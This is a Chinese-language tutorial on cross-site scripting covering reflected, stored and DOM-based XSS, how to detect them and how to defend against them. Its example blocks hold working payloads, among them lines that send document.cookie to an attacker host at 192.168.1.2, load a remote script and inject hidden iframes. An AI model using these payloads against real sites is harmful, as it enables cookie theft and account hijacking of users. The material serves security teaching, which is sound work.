# XSS跨站脚本攻击

> XSS，跨站脚本攻击，是最常见得Web应用程序安全漏洞之一
>
> XSS是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写得恶意代码，当用户使用浏览器浏览被嵌入恶意代码得网页时，恶意代码就会在用户得浏览器上执行

## XSS类型

主要分为三类，分别是：反射型、存储型和DOM型

### 反射型

反射型XSS也称为非持久性XSS，当用户访问一个带有XSS代码得URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞，这个过程就像一次反射，故称反射型XSS

* 具体实现步骤
  1. 黑客浏览网页发现页面存在XSS漏洞，编写了一个XSS脚本，然后发送给服务器
  2. 服务器返回给黑客一个url，并执行了XSS脚本
  3. 黑客通过一些欺骗手段诱使用户点击url
  4. 用户点击了url，服务器响应了用户的url，并也执行了XSS脚本
* 使用

```javascript
//直接嵌入
<script>alert('xss')</script>
//元素事件
<body onload=alert('xss')>
<a href=http://192.168.1.2>click</a>
<img src=http://192.168.1.2/a.jpg onerror=alert('xss')>
<a href=" onclick=alert('xss')">type</a>

//重定向
<script>window.location="http://www.baidu.com"</script>
<script>window.location="http:/192.168.5.128"</script>
<iframe src='http://192.168.5.128/a.jpg' height='0' width='0'></iframe>

//获取cookie值
<script>new Image().src="http://192.168.1.2/c.php?output="+document.cookie;</script>
<script>alert(document.cookie)</script>
<script src='http://192.168.1.2/a.js'></script>
var img = new Image();
img.src = 'http://192.168.1.2:88/cookie.php?cookie='+document.cookie;
```

### 存储型

存储型XSS又称为持久性XSS，存储型XSS是最危险的一种跨站脚本

允许用户存储数据的Web应用程序都可能会出现存储型XSS漏洞，当攻击者提交了一段XSS代码后，被服务器接收并存储，当攻击者再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击

* 具体实现步骤
  1. 黑客利用XSS漏洞在服务器上提交了一个XSS脚本
  2. 服务器接收到黑客请求后，将XSS脚本存储在服务器上
  3. 一段时间后，一个用户也访问了黑客所在的页面，由于XSS脚本存储在服务器上，服务器将数据从数据库调出来，里面存有XSS脚本
  4. 用户获得的页面也就会存在XSS脚本

* 使用

```js
//直接嵌入
<script>alert('xss')</script>
//斜杠也可以
<script>alert(/xss1/)</script>
//元素事件
<body onload=alert('xss')>
<a href=http://192.168.1.2>click</a>
<img src=http://192.168.1.2/a.jpg onerror=alert('xss')>
<a href=" onclick=alert('xss')">type</a>

//重定向
<script>window.location="http://www.baidu.com"</script>
<script>window.location="http:/192.168.5.128"</script>
<iframe src='http://192.168.5.128/a.jpg' height='0' width='0'></iframe>
//获取cookie
<script>new Image().src="http://192.168.1.2/c.php?output="+document.cookie;</script>
<script>alert(document.cookie)</script>
<script src='http://192.168.1.2/a.js'></script>
var img = new Image();
img.src = 'http://192.168.1.2:88/cookie.php?cookie='+document.cookie;
```

### DOM型

* 用来修改页面，不是提交脚本

* 文本对象模型xss
* 可存储型，可反射型
* 只决定输出地点

```js
<script>var img=document.createElement('img');img.src='http://192.168.1.2:88/log?'+escape(document.cookie);</script>
<script>alert('xss')</script>
</option></select><img src='' onerror=alert('xss')>
</option></select><svg/onload=alert(document.cookie)>
#<script>alert('xss')</script>
```

## 检测XSS

两种方式：手工检测和软件自动检测

* 手工检测

  使用手工检测XSS时，一定要选择有特殊意义的字符

  1. 可得知输出位置

     输入一些敏感字符，例如“<、>、"、‘、()”等，在提交后，观察是否这些字符被转义

  2. 无法得知输出位置

     有些源代码不会公开，无法得知输入的数据在后台管理页面处于何种状态，通常用”/>XSS test“来测试

* 工具检测

  XSSER、XSSF

## XSS高级利用

* 盗取用户Cookie
* 修改网页内容
* 网站挂马
* 利用网站重定向
* XSS蠕虫

## 防御XSS

XSS跨站漏洞形成的原因时对输入与输出没有进行严格的过滤

* 输入与输出（最主要的）

  将”<、>、"、'、&“等特殊字符进行转义

* 编码，验证的时候优先选择编码

* 检测和过滤，选择白名单检测和过滤

* HTTPOnly

  HTTPOnly无法防御XSS，但可以解决XSS产生的Cookie劫持攻击，这个可以阻止客户端脚本访问Cookie